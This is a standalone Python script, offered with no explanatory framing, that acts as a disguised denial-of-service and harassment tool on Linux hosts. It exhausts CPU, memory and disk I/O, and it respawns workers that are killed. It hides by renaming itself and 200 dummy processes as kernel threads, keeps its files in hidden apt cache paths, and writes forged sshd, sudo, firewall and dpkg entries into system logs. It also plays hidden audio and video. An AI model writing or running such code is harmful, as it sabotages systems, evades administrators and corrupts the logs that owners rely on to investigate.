#!/usr/bin/env python3
import argparse
import threading
import multiprocessing
import time
import os
import random
import psutil
import subprocess
import ctypes
import socket
import datetime

# ── Args ──────────────────────────────────────────────────────────────────────
parser = argparse.ArgumentParser()
parser.add_argument('--cpu',      type=int, default=90)
parser.add_argument('--mem',      type=int, default=85)
parser.add_argument('--duration', type=int, default=7200)
parser.add_argument('--audio',    type=str, default='/var/cache/apt/.snd')
parser.add_argument('--no-audio', action='store_true')
parser.add_argument('--visual',   action='store_true')
args = parser.parse_args()

stop_event = multiprocessing.Event()

# ── Process disguise ──────────────────────────────────────────────────────────
def set_proc_name(name):
    try:
        libc = ctypes.CDLL('libc.so.6')
        libc.prctl(15, name.encode(), 0, 0, 0)
    except Exception:
        pass

# ── Audio ─────────────────────────────────────────────────────────────────────
def play_audio():
    if args.no_audio:
        return
    if os.path.exists(args.audio):
        subprocess.Popen(
            ['aplay', args.audio],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

# ── Visual ────────────────────────────────────────────────────────────────────
def visual_flash():
    if not args.visual:
        return
    try:
        subprocess.Popen(
            ['mpv', '--fullscreen', '--no-terminal', '--really-quiet',
             '/var/cache/apt/.vid.mp4'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env={**os.environ, 'DISPLAY': ':0'}
        )
    except Exception:
        pass

# ── CPU burn ──────────────────────────────────────────────────────────────────
def cpu_burn(stop_event):
    set_proc_name('kworker/u4:2')
    while not stop_event.is_set():
        for _ in range(100000):
            pass
        time.sleep(0.002)

# ── Memory pressure ───────────────────────────────────────────────────────────
def memory_pressure_process(stop_event):
    set_proc_name('kworker/u4:2')
    chunks = []
    while not stop_event.is_set():
        try:
            mem = psutil.virtual_memory()
            if mem.percent < args.mem:
                chunks.append(bytearray(50 * 1024 * 1024))
            elif chunks:
                chunks.pop()
            time.sleep(0.1)
        except MemoryError:
            if chunks:
                chunks.pop()

# ── Process supervisor ────────────────────────────────────────────────────────
def process_supervisor(stop_event, target_fn, count):
    """
    Maintains exactly `count` live child processes running target_fn.
    Any that die for any reason are immediately replaced within 0.5 seconds.
    """
    procs = []
    while not stop_event.is_set():
        # reap dead
        procs = [p for p in procs if p.is_alive()]
        # top up
        while len(procs) < count:
            p = multiprocessing.Process(target=target_fn, args=(stop_event,))
            p.daemon = True
            p.start()
            procs.append(p)
        time.sleep(0.5)

# ── Log flood ─────────────────────────────────────────────────────────────────
LOG_TEMPLATES = {
    '/var/log/syslog': [
        "{ts} {host} systemd[1]: Started Session {n} of user {user}.",
        "{ts} {host} kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:0c:29:{a:02x}:{b:02x}:{c:02x} SRC=10.0.{a}.{b} DST=10.0.{c}.{d} LEN=60 TOS=0x00 TTL=64 ID={n} PROTO=TCP SPT={port} DPT=22 SYN",
        "{ts} {host} NetworkManager[{n}]: <info>  [1708123456.789] device (eth0): state change: activated -> deactivating",
        "{ts} {host} systemd-resolved[{n}]: Server returned error NXDOMAIN, mitigating potential DNS hijacking by lowering TTL",
        "{ts} {host} systemd[1]: systemd-tmpfiles-clean.service: Succeeded.",
        "{ts} {host} cron[{n}]: (root) CMD ([ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)",
        "{ts} {host} dbus-daemon[{n}]: [system] Successfully activated service '{user}.service'",
        "{ts} {host} snapd[{n}]: 2026/02/18 {ts} api.go:200: [from {user}] GET /v2/snaps",
    ],
    '/var/log/auth.log': [
        "{ts} {host} sshd[{n}]: Accepted publickey for {user} from 10.0.{a}.{b} port {port}",
        "{ts} {host} sshd[{n}]: Disconnected from 10.0.{a}.{b} port {port}",
        "{ts} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt",
        "{ts} {host} passwd[{n}]: pam_unix(passwd:chauthtok): password changed for {user}",
    ],
    '/var/log/kern.log': [
        "{ts} {host} kernel: [UFW BLOCK] IN=eth0 SRC=10.0.{a}.{b} DST=10.0.{c}.{d} PROTO=TCP",
        "{ts} {host} kernel: audit: type=1400 audit({n}.{port}:42): apparmor=ALLOWED",
        "{ts} {host} kernel: NET: Registered PF_ALG protocol family",
    ],
    '/var/log/dpkg.log': [
        "{ts} status installed {pkg}:{arch} {ver}",
        "{ts} configure {pkg}:{arch} {ver}",
        "{ts} trigproc {pkg}:{arch} {ver} <none>",
    ],
}

USERS    = ['root', 'ubuntu', 'debian', 'admin', 'sysadmin']
PACKAGES = ['libssl1.1', 'openssl', 'python3-apt', 'curl', 'wget', 'bash']
ARCHES   = ['amd64', 'all']

def flood_logs(stop_event):
    hostname = socket.gethostname()
    log_files = list(LOG_TEMPLATES.keys())
    while not stop_event.is_set():
        log_file = random.choice(log_files)
        template = random.choice(LOG_TEMPLATES[log_file])
        now = datetime.datetime.now()
        if 'dpkg' in log_file:
            ts = now.strftime('%Y-%m-%d %H:%M:%S')
        else:
            ts = now.strftime('%b %d %H:%M:%S')
        entry = template.format(
            ts=ts, host=hostname,
            n=random.randint(1000, 9999),
            user=random.choice(USERS),
            a=random.randint(0, 254), b=random.randint(0, 254),
            c=random.randint(0, 254), d=random.randint(0, 254),
            port=random.randint(1024, 65535),
            pkg=random.choice(PACKAGES),
            arch=random.choice(ARCHES),
            ver=f'{random.randint(1,3)}.{random.randint(0,9)}.{random.randint(0,9)}',
        )
        try:
            with open(log_file, 'a') as f:
                f.write(entry + '\n')
        except PermissionError:
            pass
        time.sleep(random.uniform(0.01, 0.05))

# ── Disk noise ────────────────────────────────────────────────────────────────
def disk_noise(stop_event):
    while not stop_event.is_set():
        try:
            path = f"/tmp/.{random.randbytes(4).hex()}"
            with open(path, 'wb') as f:
                f.write(random.randbytes(512 * 1024))
            os.remove(path)
        except Exception:
            pass
        time.sleep(0.1)

# ── I/O starvation ────────────────────────────────────────────────────────────
IO_DIR          = '/var/cache/apt/.iocache'
IO_FILE_SIZE_MB = 512
IO_THREAD_COUNT = 6

def io_worker(stop_event, file_path):
    chunk = os.urandom(4096)
    if not os.path.exists(file_path):
        try:
            with open(file_path, 'wb') as f:
                for _ in range(IO_FILE_SIZE_MB * 256):
                    f.write(chunk)
        except Exception:
            return
    try:
        fh = open(file_path, 'r+b')
    except Exception:
        return
    file_size = os.path.getsize(file_path)
    while not stop_event.is_set():
        try:
            op     = random.choice(['read', 'write'])
            offset = random.randint(0, max(0, file_size - 4096))
            offset = offset - (offset % 512)
            fh.seek(offset)
            if op == 'write':
                fh.write(os.urandom(4096))
                if random.randint(0, 20) == 0:
                    os.fsync(fh.fileno())
            else:
                fh.read(4096)
        except Exception:
            time.sleep(0.1)
    fh.close()

def start_io_pressure(stop_event):
    os.makedirs(IO_DIR, exist_ok=True)
    for i in range(IO_THREAD_COUNT):
        file_path = os.path.join(IO_DIR, f'.cache_{i}.bin')
        t = threading.Thread(target=io_worker, args=(stop_event, file_path,), daemon=True)
        t.start()

# ── Process flood ─────────────────────────────────────────────────────────────
PROC_TARGET         = 200
PROC_CHECK_INTERVAL = 5

GHOST_NAMES = [
    'kworker/u4:2', 'kworker/0:1H', 'migration/0', 'ksoftirqd/0',
    'rcu_sched',    'kdevtmpfs',    'netns',        'khungtaskd',
    'oom_reaper',   'writeback',    'kcompactd0',   'kblockd',
    'kswapd0',      'jbd2/sda1-8',  'ext4-rsv-conver', 'ipv6_addrconf',
    'kstrp',        'zswap-shrink', 'kthreadd',     'systemd-udevd',
]

ghost_procs = []
ghost_lock  = threading.Lock()

def spawn_ghost():
    name = random.choice(GHOST_NAMES)
    try:
        p = subprocess.Popen(
            ['sleep', str(random.randint(300, 900))],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True
        )
        try:
            with open(f'/proc/{p.pid}/comm', 'w') as f:
                f.write(name + '\n')
        except Exception:
            pass
        return p
    except Exception:
        return None

def process_flood(stop_event):
    while not stop_event.is_set():
        with ghost_lock:
            alive = [p for p in ghost_procs if p.poll() is None]
            ghost_procs.clear()
            ghost_procs.extend(alive)
            needed = PROC_TARGET - len(ghost_procs)
            for _ in range(needed):
                p = spawn_ghost()
                if p:
                    ghost_procs.append(p)
        time.sleep(PROC_CHECK_INTERVAL)

# ── Watchdog ──────────────────────────────────────────────────────────────────
def watchdog(stop_event):
    while not stop_event.is_set():
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory().percent
        if cpu > 95 or mem > 92:
            time.sleep(2)
        time.sleep(0.5)

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    set_proc_name('kworker/u4:2')

    threading.Thread(target=play_audio, daemon=True).start()
    visual_flash()

    # cpu — multiprocessing to bypass GIL
    num_workers = multiprocessing.cpu_count() * 2
    cpu_procs = []
    for _ in range(num_workers):
        p = multiprocessing.Process(target=cpu_burn, args=(stop_event,))
        p.daemon = True
        p.start()
        cpu_procs.append(p)

    # memory — supervised child processes, respawn instantly on death
    threading.Thread(
        target=process_supervisor,
        args=(stop_event, memory_pressure_process, 4),
        daemon=True
    ).start()

    # supporting threads
    for _ in range(4):
        threading.Thread(target=flood_logs,  args=(stop_event,), daemon=True).start()

    threading.Thread(target=disk_noise,    args=(stop_event,), daemon=True).start()
    threading.Thread(target=watchdog,      args=(stop_event,), daemon=True).start()
    threading.Thread(target=process_flood, args=(stop_event,), daemon=True).start()

    start_io_pressure(stop_event)

    # auto kill after duration
    time.sleep(args.duration)
    stop_event.set()

    for p in cpu_procs:
        p.join(timeout=2)

    with ghost_lock:
        for p in ghost_procs:
            try:
                p.terminate()
            except Exception:
                pass

if __name__ == '__main__':
    main()
